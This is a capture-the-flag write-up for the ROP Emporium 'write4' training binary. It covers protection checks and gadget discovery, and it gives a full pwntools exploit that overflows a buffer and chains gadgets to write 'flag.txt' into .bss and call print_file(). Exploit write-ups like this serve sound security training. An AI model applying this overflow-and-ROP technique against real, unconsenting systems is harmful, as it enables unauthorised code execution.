# ✍️ write4 – ROP Emporium Challenge

> Category: Binary Exploitation – ROP Basics  
> Difficulty: Medium  
> Arch: `amd64`  
> Objective: Use ROP to write `"flag.txt"` into memory and call `print_file()`.

---

## 🛠️ 1. Initial Analysis

We start by checking the binary protections:

```bash
checksec write4
```

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

### ✅ Observations:
- **NX enabled** → no shellcode on the stack.  
- **No PIE** → static addresses, easier exploitation.  
- **No canary** → buffer overflow is possible.  
- **Not stripped** → function symbols are available.  

---

## 🔍 2. Exploring Symbols

Using `nm`:

```bash
nm write4
```

Relevant symbols:

```
U print_file
U pwnme
```

Loading the binary in **Ghidra**, we see:  

- **main** simply calls `pwnme()`.  
- **pwnme** reads user input (vulnerable).  
- **usefulFunction** calls `print_file("nonexistent")`.  

So our goal is to **call `print_file("flag.txt")`**.

---

## 📦 3. Finding a Writable Section

Running in `radare2`:

```bash
r2 ./write4
> iS
```

We find:

```
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
```

The **`.bss` section** is writable → perfect place to store `"flag.txt"`.

---

## 🧱 4. Finding Gadgets

We need gadgets to:  
1. Write `"flag.txt"` into `.bss`  
2. Pass the address of `.bss` as argument (`rdi`) to `print_file()`  

Using `ROPgadget`:

- **Write gadget**:
```
0x0000000000400628 : mov qword ptr [r14], r15 ; ret
```

- **Register control gadget**:
```
0x0000000000400690 : pop r14 ; pop r15 ; ret
```

- **Function argument gadget**:
```
0x0000000000400693 : pop rdi ; ret
```

---

## 🧪 5. Crafting the Exploit

Steps:
1. Overflow the buffer (`"A" * 40`)  
2. Load `.bss` into `r14` and `"flag.txt"` into `r15`  
3. Write `"flag.txt"` into `.bss` (`mov [r14], r15`)  
4. Set `rdi = .bss`  
5. Call `print_file()`  

### Final Payload:

```python
from pwn import *

p = process("./write4")

payload  = b"A" * 40                        # Overflow buffer
payload += p64(0x400690)                    # pop r14 ; pop r15 ; ret
payload += p64(0x601038)                    # r14 = .bss
payload += b"flag.txt"                      # r15 = "flag.txt"
payload += p64(0x400628)                    # mov [r14], r15 ; ret
payload += p64(0x400693)                    # pop rdi ; ret
payload += p64(0x601038)                    # rdi = address of "flag.txt"
payload += p64(0x400620)                    # call print_file()

p.sendline(payload)
p.interactive()
```

---

## 🎯 6. Result

Running the exploit prints the flag:

```
ROPE{a_placeholder_32byte_flag!}
```

---

## 🧠 Key Takeaways

- Writing data into `.bss` is a common technique in ROP when strings don’t exist in memory.  
- Gadgets like `pop r14 ; pop r15 ; ret` combined with `mov [r14], r15` allow controlled memory writes.  
- Always check writable memory sections (`.bss`, `.data`).  
- `print_file("flag.txt")` is the classic objective in ROP Emporium.  
